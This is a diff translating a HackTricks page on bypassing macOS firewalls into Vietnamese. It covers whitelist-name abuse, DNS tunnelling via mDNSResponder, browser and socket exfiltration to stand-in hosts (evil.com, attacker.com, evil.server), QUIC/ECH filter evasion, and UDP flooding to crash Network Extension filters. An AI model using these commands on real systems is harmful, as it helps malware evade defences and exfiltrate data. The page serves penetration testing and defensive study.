@@ -1,60 +1,60 @@
-# macOS Bypassing Firewalls
+# Bỏ qua firewall trên macOS
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## Các kỹ thuật đã tìm thấy
 
-The following techniques were found working in some macOS firewall apps.
+Các kỹ thuật sau đây đã được phát hiện là có hiệu quả với một số ứng dụng firewall trên macOS.
 
-### Abusing whitelist names
+### Lạm dụng tên trong whitelist
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Ví dụ: đặt tên malware theo tên các tiến trình macOS phổ biến như **`launchd`**
 
 ### Synthetic Click
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Nếu firewall yêu cầu người dùng cấp quyền, hãy khiến malware **nhấp vào nút cho phép**
 
-### **Use Apple signed binaries**
+### **Sử dụng binary được Apple ký**
 
-- Like **`curl`**, but also others like **`whois`**
+- Chẳng hạn như **`curl`**, ngoài ra còn có các binary khác như **`whois`**
 
-### Well known apple domains
+### Các domain phổ biến của Apple
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Firewall có thể cho phép kết nối đến các domain phổ biến của Apple như **`apple.com`** hoặc **`icloud.com`**. iCloud cũng có thể được dùng làm C2.
 
-### Generic Bypass
+### Bỏ qua tổng quát
 
-Some ideas to try to bypass firewalls
+Một số ý tưởng để thử bỏ qua firewall
 
-### Check allowed traffic
+### Kiểm tra lưu lượng được cho phép
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
+Biết lưu lượng nào được cho phép sẽ giúp bạn xác định các domain có thể nằm trong whitelist hoặc những ứng dụng được phép truy cập các domain đó
 
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 
-### Abusing DNS
+### Lạm dụng DNS
 
-On macOS a process does **not** talk to the DNS server itself. Name resolution is brokered over **XPC** by **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), an Apple-signed system daemon, so every lookup on the machine leaves the host as traffic **from `mDNSResponder`** instead of from the process that wanted it. Firewalls therefore tend to trust that daemon unconditionally — denying it would break name resolution for the whole system.<sup>[[1]](#references)</sup>
+Trên macOS, một tiến trình **không** tự giao tiếp với máy chủ DNS. Việc phân giải tên được **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), một daemon hệ thống do Apple ký, trung gian qua **XPC**, vì vậy mọi truy vấn trên máy đều rời khỏi máy dưới dạng lưu lượng **từ `mDNSResponder`**, thay vì từ tiến trình khởi tạo truy vấn. Do đó, firewall thường tin cậy daemon này vô điều kiện — chặn nó sẽ làm hỏng việc phân giải tên trên toàn hệ thống.<sup>[[1]](#references)</sup>
 
-That makes DNS a channel that stays open even when the firewall blocks the malware's own sockets:<sup>[[1]](#references)</sup>
+Điều đó biến DNS thành một kênh vẫn hoạt động ngay cả khi firewall chặn các socket của chính malware:<sup>[[1]](#references)</sup>
 
-1. The malware tries to connect to `evil.com`. Its **own** outbound connection is examined by the firewall and **blocked**.
-2. The malware instead asks `mDNSResponder` to **resolve** `evil.com`, over XPC.
-3. The firewall examines the resulting query, sees the trusted Apple-signed resolver as the originator, and **allows it**.
-4. The query reaches the DNS server — and if the attacker runs the authoritative server for `evil.com`, they control both ends of the exchange.
+1. Malware cố kết nối đến `evil.com`. Kết nối outbound **của chính nó** bị firewall kiểm tra và **chặn**.
+2. Thay vào đó, malware yêu cầu `mDNSResponder` **phân giải** `evil.com` qua XPC.
+3. Firewall kiểm tra truy vấn được tạo ra, thấy resolver đáng tin cậy có chữ ký Apple là nguồn gửi và **cho phép** truy vấn.
+4. Truy vấn đến máy chủ DNS — và nếu attacker vận hành máy chủ authoritative cho `evil.com`, họ kiểm soát cả hai đầu của quá trình trao đổi.
 
-Since the attacker owns that zone, no "connection" is ever needed: data is smuggled out inside the **queried labels** (e.g. `<encoded-chunk>.evil.com`) and commands come back inside the **answer records** (TXT, A, CNAME…), which is classic DNS tunnelling riding on a fully whitelisted process.
+Vì attacker sở hữu zone đó, không cần thiết lập “kết nối”: dữ liệu được tuồn ra bên trong **các nhãn được truy vấn** (ví dụ: `<encoded-chunk>.evil.com`), còn lệnh được gửi về bên trong **các bản ghi trả lời** (TXT, A, CNAME…), tạo thành kỹ thuật DNS tunnelling cổ điển thông qua một tiến trình được whitelist hoàn toàn.
 
-Any unprivileged process can drive the daemon directly, which is an easy way to confirm the path is open:
+Bất kỳ tiến trình không có đặc quyền nào cũng có thể trực tiếp điều khiển daemon, đây là cách dễ dàng để xác nhận kênh này vẫn mở:
 
 ```bash
 # resolution is performed by mDNSResponder on the caller's behalf
 dns-sd -G v4v6 evil.com
 ```
 
-### Via Browser apps
+### Thông qua ứng dụng trình duyệt
 
 - **oascript**
 
@@ -85,10 +85,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 
-### Via processes injections
+### Thông qua process injection
 
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
-
+Nếu bạn có thể **inject code vào một process** được phép kết nối đến bất kỳ máy chủ nào, bạn có thể bypass các biện pháp bảo vệ của firewall:
 
 {{#ref}}
 macos-proces-abuse/
@@ -96,35 +95,36 @@ macos-proces-abuse/
 
 ---
 
-## Recent macOS firewall bypass vulnerabilities (2023-2025)
+## Các lỗ hổng bypass firewall macOS gần đây (2023-2025)
 
-### Web content filter (Screen Time) bypass – **CVE-2024-44206**
-In July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web content filter” used by Screen Time parental controls.
-A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.<sup>[[2]](#references)</sup>
+### Bypass Web content filter (Screen Time) – **CVE-2024-44206**
+Vào tháng 7 năm 2024, Apple đã vá một lỗi nghiêm trọng trong Safari/WebKit khiến “Web content filter” trên toàn hệ thống, được Screen Time sử dụng để kiểm soát của phụ huynh, bị vô hiệu hóa.
 
-Practical test (un-patched system):
+Một URI được tạo đặc biệt (ví dụ: chứa “://” được mã hóa URL hai lần) không được Screen Time ACL nhận diện nhưng lại được WebKit chấp nhận, khiến yêu cầu được gửi đi mà không qua bộ lọc. Vì vậy, bất kỳ process nào có thể mở URL (bao gồm cả code chạy trong sandbox hoặc chưa được ký) đều có thể truy cập các domain bị người dùng hoặc hồ sơ MDM chặn rõ ràng.<sup>[[2]](#references)</sup>
+
+Kiểm tra thực tế (trên hệ thống chưa được vá):
 
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
 
-### Packet Filter (PF) rule-ordering bug in early macOS 14 “Sonoma”
-During the macOS 14 beta cycle Apple introduced a regression in the userspace wrapper around **`pfctl`**.
-Rules that were added with the `quick` keyword (used by many VPN kill-switches) were silently ignored, causing traffic leaks even when a VPN/firewall GUI reported *blocked*. The bug was confirmed by several VPN vendors and fixed in RC 2 (build 23A344).<sup>[[6]](#references)</sup>
+### Lỗi sắp xếp thứ tự rule của Packet Filter (PF) trong macOS 14 “Sonoma” bản đầu
+Trong chu kỳ beta của macOS 14, Apple đã đưa vào một regression trong wrapper userspace của **`pfctl`**.
+Các rule được thêm với từ khóa `quick` (được nhiều VPN kill-switch sử dụng) đã bị bỏ qua âm thầm, gây ra traffic leak ngay cả khi GUI của VPN/firewall hiển thị *blocked*. Lỗi này đã được một số nhà cung cấp VPN xác nhận và được khắc phục trong RC 2 (build 23A344).<sup>[[6]](#references)</sup>
 
-Quick leak-check:
+Kiểm tra leak nhanh:
 
 ```bash
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
 
-### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
-Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
-Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.<sup>[[3]](#references)</sup>
+### Lạm dụng các dịch vụ trợ giúp có chữ ký Apple (legacy – trước macOS 11.2)
+Trước macOS 11.2, **`ContentFilterExclusionList`** cho phép khoảng 50 binary của Apple, chẳng hạn như **`nsurlsessiond`** và App Store, bypass mọi firewall lọc socket được triển khai bằng framework Network Extension (LuLu, Little Snitch, v.v.).
+Malware chỉ cần spawn một tiến trình nằm trong danh sách loại trừ—hoặc inject code vào đó—rồi tunnel lưu lượng của chính nó qua socket đã được cho phép. Apple đã loại bỏ hoàn toàn danh sách loại trừ trong macOS 11.2, nhưng kỹ thuật này vẫn hữu ích trên các hệ thống không thể nâng cấp.<sup>[[3]](#references)</sup>
 
-Example proof-of-concept (pre-11.2):
+Ví dụ proof-of-concept (trước 11.2):
 
 ```python
 import subprocess, socket
@@ -135,10 +135,10 @@ s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
 
-### QUIC/ECH to evade Network Extension domain filters (macOS 12+)
-NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.<sup>[[5]](#references)</sup>
+### Dùng QUIC/ECH để né bộ lọc domain của Network Extension (macOS 12+)
+NEFilter Packet/Data Providers dựa vào SNI/ALPN trong TLS ClientHello. Với **HTTP/3 qua QUIC (UDP/443)** và **Encrypted Client Hello (ECH)**, SNI vẫn được mã hóa, NetExt không thể phân tích luồng và các quy tắc hostname thường chuyển sang fail-open, cho phép malware truy cập các domain bị chặn mà không cần truy vấn DNS.<sup>[[5]](#references)</sup>
 
-Minimal PoC:
+PoC tối giản:
 
 ```bash
 # Chrome/Edge – force HTTP/3 and ECH
@@ -151,12 +151,12 @@ Minimal PoC:
 curl --http3-only https://attacker.com/payload
 ```
 
-If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.
+Nếu QUIC/ECH vẫn được bật, đây là cách dễ dàng để né bộ lọc hostname.
 
-### macOS 15 “Sequoia” Network Extension instability (2024–2025)
-Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.<sup>[[4]](#references)</sup>
+### Sự bất ổn của Network Extension trên macOS 15 “Sequoia” (2024–2025)
+Các bản dựng 15.0/15.1 ban đầu khiến các bộ lọc **Network Extension** của bên thứ ba gặp sự cố (LuLu, Little Snitch, Defender, SentinelOne, v.v.). Khi bộ lọc khởi động lại, macOS xóa các quy tắc flow và nhiều sản phẩm chuyển sang chế độ fail-open. Việc làm ngập bộ lọc bằng hàng nghìn flow UDP ngắn (hoặc buộc dùng QUIC/ECH) có thể liên tục kích hoạt sự cố và tạo ra một khoảng thời gian cho C2/exfil trong khi giao diện GUI vẫn báo rằng firewall đang chạy.<sup>[[4]](#references)</sup>
 
-Quick reproduction (safe lab box):
+Cách tái hiện nhanh (trên máy lab an toàn):
 
 ```bash
 # create many short UDP flows to exhaust NE filter queues
@@ -172,27 +172,26 @@ log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslo
 
 ---
 
-## Tooling tips for modern macOS
+## Mẹo sử dụng công cụ trên macOS hiện đại
 
-1. Inspect current PF rules that GUI firewalls generate:
+1. Kiểm tra các quy tắc PF hiện tại do firewall GUI tạo ra:
    ```bash
    sudo pfctl -a com.apple/250.ApplicationFirewall -sr
    ```
-2. Enumerate binaries that already hold the *outgoing-network* entitlement (useful for piggy-backing):
+2. Liệt kê các binary đã có entitlement *outgoing-network* (hữu ích để piggy-backing):
    ```bash
    codesign -d --entitlements :- /path/to/bin 2>/dev/null \
        | plutil -extract com.apple.security.network.client xml1 -o - -
    ```
-3. Programmatically register your own Network Extension content filter in Objective-C/Swift.  
-   A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s **LuLu** source code.
+3. Đăng ký bộ lọc nội dung Network Extension của riêng bạn bằng Objective-C/Swift theo cách lập trình.  
+   Mã PoC rootless tối thiểu chuyển tiếp các gói tin đến một socket cục bộ có trong mã nguồn **LuLu** của Patrick Wardle.
 
 ## References
 
-- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
-- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
-- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
-- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
-- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
-- [6] [macOS 14 Sonoma firewall bug fixed! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)
-
+- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Tạo dựng và phá vỡ firewall macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+- [2] [Lỗ hổng bypass bộ lọc nội dung web của Apple cho phép truy cập không hạn chế vào nội dung bị chặn (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
+- [3] [Apple gỡ bỏ tính năng macOS cho phép ứng dụng bypass bảo mật firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
+- [4] [Các sản phẩm an ninh mạng ngừng hoạt động sau bản cập nhật macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
+- [5] [Sử dụng bảo vệ mạng để giúp ngăn macOS kết nối đến các trang web độc hại - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
+- [6] [Đã sửa lỗi firewall macOS 14 Sonoma! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)
 {{#include ../../banners/hacktricks-training.md}}
